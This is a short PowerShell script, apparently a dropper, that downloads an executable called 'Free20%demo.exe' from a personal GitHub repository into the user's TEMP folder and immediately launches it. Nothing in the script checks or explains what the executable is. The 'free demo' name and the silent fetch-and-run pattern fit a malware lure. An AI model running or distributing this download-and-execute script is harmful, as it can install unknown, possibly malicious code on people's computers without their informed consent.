$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/180cri/refs/heads/main/Free20%demo.exe"
$file = "$env:TEMP\Free20%demo.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
